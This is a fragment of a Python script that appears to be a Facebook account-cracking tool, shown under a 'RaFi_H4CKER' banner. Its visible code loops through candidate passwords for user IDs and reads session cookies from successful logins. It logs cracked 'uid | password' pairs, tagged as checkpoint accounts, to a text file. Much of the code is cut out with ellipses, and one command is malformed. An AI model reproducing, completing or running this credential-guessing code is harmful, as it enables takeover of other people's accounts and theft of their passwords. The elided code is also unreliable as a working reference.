...
┌______     ______ _   _   _                       
| ___ \    |  ___(_) | | | |                      
| |_/ /__ _| |_   _  | |_| | __ _ ___  __ _ _ __  
|    // _` |  _| | | |  _  |/ _` / __|/ _` | '_ \ 
| |\ \ (_| | |   | | | | | | (_| \__ \ (_| | | | |
\_| \_\__,_\_|   |_| \_| |_/\__,_|___/\__,_|_| |_|
                                                  
                                                  
    ┌━━━━━━━━━━━━━━━━━ RaFi ━━━━━━━━━━━━━━━━━━┑
               \033[1;97mCREATED BY   :  RaFi_H4CKER            
               \033[1;91mFACEBOK      :  RaFi Hasan             
               \033[1;97mGITHUB       :  HACKER-X_RaFi     
               \033[1;91mSTATUS       :   𝑭𝑹𝑬𝑬😴            
               \033[1;97mTEAM         :  RaFi 404        
...
def menu():
	...
	if ot == '1':
		os.system('xdg-open https://youtube.com/@ItsRafi-?si=5b0KtcyjtITRucIU')
...
def menu1():
	...
	if ot == '2':
		...
		rndm()
	if ot == '3':
		os.system('xdg-openhttps://youtube.com/@ItsRafi-?si=5b0KtcyjtITRucIU')
        ...
        for ps in pwx:
         ...
         #   log_cookies=session.cookies.get_dict().keys()
            ...
            #	botok(uid,ps)
            	...
            	coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
            	cid = coki[82:97]
            	print('\33[1;30m(RaFi-Cp [💔] '+cid+ ' | ' +ps+'  |>>'+tahunng(cid))
            	#print('\033[1;92m[\033[1;92mðŸª\033[1;92m]COOKIES : \033[1;92m'+coki+ '')
            	open('RaFi-CP.txt', 'a').write( uid+' | '+ps+' \n')
            	cps.append(cid)
            	break
            else:
            	#print (random_header())
